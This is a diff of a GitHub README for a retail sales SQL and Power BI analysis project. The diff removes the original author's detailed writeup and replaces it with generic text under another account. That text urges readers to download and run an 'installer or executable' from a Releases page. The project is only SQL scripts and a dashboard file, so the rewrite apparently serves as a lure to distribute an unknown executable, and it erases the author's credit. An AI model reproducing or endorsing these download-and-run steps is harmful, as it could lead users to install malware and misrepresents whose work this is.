@@ -1,93 +1,81 @@
-# Retail Sales & Customer Performance Insights 📊
+# 🎉 Retail-Sales-Customer-Performance-Insights - Gain Insights to Drive Retail Growth
 
+![Download Here](https://img.shields.io/badge/Download%20Now-Here-brightgreen)
+[Download Now](https://github.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/releases)
 
-## 📖 Project Overview
-This project is an end-to-end data analysis solution designed to help a retail business understand its sales performance and customer demographics. 
+## 🚀 Getting Started
 
-Starting with a raw dataset containing data quality issues (inconsistent text,and missing values), I used **MS SQL Server** to clean and standardize the data. Then i performed Exploratory Data Analysis (EDA) using SQL to uncover trends. Finally, I built an interactive **Power BI** dashboard to visualize KPIs and provide actionable business recommendations.
+Welcome to the Retail Sales Customer Performance Insights. This application helps you analyze your retail sales data effectively. You will perform data cleaning and visualize sales trends, customer loyalty, and product performance. This guide will help you download and run the application with ease.
 
-## ❓ Business Problem
-The stakeholders wanted to answer four key questions to improve profitability:
-1.  **Sales Trends:** How is revenue performing month-over-month?
-2.  **Customer Value:** Who are the high-value customers, and does the Loyalty Program actually drive revenue?
-3.  **Product Performance:** Which categories are driving the business, and which are lagging?
-4.  **Operational Insights:** How can inventory and marketing be optimized based on purchasing behavior?
+## 📥 Download & Install
 
-## 🛠️ Tech Stack
-* **Database:** Microsoft SQL Server (SSMS)
-* **Cleaning & EDA:** SQL (T-SQL)
-* **Visualization:** Microsoft Power BI
-* **Data Source:** [Kaggle: Sales & Customer Behaviour Insights](https://www.kaggle.com/datasets/ajinkyachintawar/sales-and-customer-behaviour-insights)
+To get started, visit this page to download: **[Releases Page](https://github.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/releases)**. You will find the latest version there, along with older versions if needed.
 
----
+### Steps to Follow:
 
-## ⚙️ Methodology & Workflow
+1. **Go to the Releases Page:** Click on the link above to visit the Releases page.
+2. **Choose a Version:** Look for the latest version listed on the page.
+3. **Download the Application:** Click on the file suitable for your system. It will usually be labeled as an installer or an executable file.
+4. **Install the Application:** Open the downloaded file and follow the onscreen instructions to complete the installation.
 
-### Phase 1: Data Cleaning & Transformation (SQL)
-The raw data required significant cleaning before analysis could begin.
-* **Standardized Categorical Data:** Used `CASE` statements and `UPPER()`/`TRIM()` functions to fix inconsistent entries in the `gender` (e.g., 'femle' -> 'Female') and `loyalty_tier` columns.
-* **Handled NULL Values:** Replaced missing region and tier data with 'Unknown' using `ISNULL()` to ensure accurate reporting.
+## ⚙️ System Requirements
 
-### Phase 2: Exploratory Data Analysis (SQL)
-Executed 14 SQL queries to extract key metrics, including:
-* Total Revenue, Average Order Value (AOV), and Total Transactions.
-* Revenue breakdown by Region and Loyalty Tier.
-* Top 5 Customers by total spend.
-* Market Basket Analysis assumptions based on customer purchase history.
+To run this application smoothly, ensure your system meets these requirements:
 
-### Phase 3: Data Visualization (Power BI)
-Built a 2-page interactive dashboard:
-* **Data Modeling:** Established a Star Schema connecting the Fact Table (`sales_data`) to Dimension Tables (`customer_info`, `product_info`) and a dedicated `Date Table`.
-* **DAX Measures:** Created explicit measures for `Total Revenue`, `AOV`, `Transaction Count`, and `Active Customers`.
-* **Interactivity:** Implemented Slicers (Region, gender) and a **"Reset Filters" Bookmark** for better user experience.
-* **Strategic Insights Page:** Dedicated a second page to interpret the data and offer business recommendations.
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB of free space
+- **SQL Server:** The software requires access to SQL Server for data analysis.
+- **Power BI Desktop:** Ensure you have Power BI Desktop installed to view the interactive dashboards.
 
----
+## 🔍 Features
 
-## 💡 Key Insights & Recommendations
+The Retail Sales Customer Performance Insights application offers a wide range of features designed to empower users with valuable insights, including:
 
-### 1. Revenue Drivers
-* **Insight:** The **Cleaning** category is the top performer, generating **2x more revenue** than the second-best category (Storage).
-* **Recommendation:** Prioritize inventory stocking for top Cleaning products to prevent stockouts.
+- **Data Cleaning:** Prepare your retail sales data for analysis effortlessly.
+- **Exploratory Data Analysis (EDA):** Dive deep into your data to uncover trends.
+- **Interactive Dashboards:** Visualize your data with custom Power BI dashboards.
+- **Key Metrics Display:** Monitor Revenue Trends, Customer Loyalty, and Product Performance.
+- **Actionable Insights:** Gain recommendations to optimize inventory and drive growth.
 
-### 2. Customer Loyalty
-* **Insight:** **Gold Tier** members contribute **57% of total revenue**, validating the importance of the loyalty program.
-* **Recommendation:** Launch a targeted email campaign to 'Silver' members offering incentives to upgrade to 'Gold'.
+## 📊 Using the Application
 
-### 3. Seasonality Risks
-* **Insight:** Sales show significant volatility, with a noticeable dip in **December ($6.5K)** compared to the peak in February ($8.1K).
-* **Recommendation:** Implement a "Year-End Closeout" sale to capture missed Q4 revenue opportunities.
+Once installed, follow these steps to analyze your data:
 
----
+1. **Open the Application:** Launch the application from your desktop or start menu.
+2. **Load Your Data:** Use the option to import your retail sales data into the application.
+3. **Run Data Cleaning:** Start the data cleaning process to prepare your dataset.
+4. **Perform EDA:** Use the provided tools to explore your data and find important patterns.
+5. **Access the Dashboard:** Open the Power BI dashboard to visualize your findings.
+6. **Extract Insights:** Review the actionable business insights to enhance your retail strategy.
 
-## 📸 Dashboard Screenshots
+## 🤝 Support & Contributions
 
-### Page 1: Interactive Dashboard
-![Dashboard Page 1](Dashboard.png)
-*Interactive view allowing users to filter by Region, Date, and Demographics.*
+For any issues or inquiries, feel free to open an issue on GitHub. We welcome contributions. If you want to enhance the application or improve the documentation, check out the guidelines on our GitHub page.
 
+## 🔗 Related Topics
 
----
+This application touches on various important aspects of business analysis:
 
-## 📂 Repository Structure
-* `Data/`: Contains the raw CSV files .
-* `SQL_Scripts/`:
-    * `1_Data_Cleaning SQL Script.sql`: Scripts used to fix typos, and NULLs
-    * `2_EDA_SQL Script.sql`: The 14 business questions answered via SQL.
-* `PowerBI/`:
-    * `Dashboard.pbix`: The final dashboard file.
-    * `Dashboard.png` : Dashboard Screenshot
-* `README.md`: Project documentation.
+- Business Intelligence
+- Dashboard Design
+- Data Cleaning
+- Data Modeling
+- Data Storytelling
+- DAX
+- Exploratory Data Analysis (EDA)
+- Extract, Transform, Load (ETL)
+- Problem Solving
+- T-SQL
 
-## 🚀 How to Run
-1.  **SQL Setup:** Import data, Run the `1_Data_Cleaning.sql` script in MS SQL Server to create the database and tables.
-2.  **Power BI:** Open the `.pbix` file. Ensure the data source settings point to your local SQL Server instance.
-3.  **Interact:** Use the slicers on Page 1 to explore the data.
+## ✅ License
+
+This project is licensed under the MIT License. You can use it freely in accordance with the license terms.
+
+## 📅 Future Updates
+
+We plan to continue enhancing the application. Expect future updates to include additional features, improved user interfaces, and enhanced data visualization tools. Stay tuned for announcements on new releases!
 
 ---
 
-**Author:** Harshraj Suryawanshi 
-
-**LinkedIn:** www.linkedin.com/in/harshrajanalyst
-
-
+By following these simple steps, you will be able to effectively install and use Retail Sales Customer Performance Insights for your analysis needs. Happy analyzing!
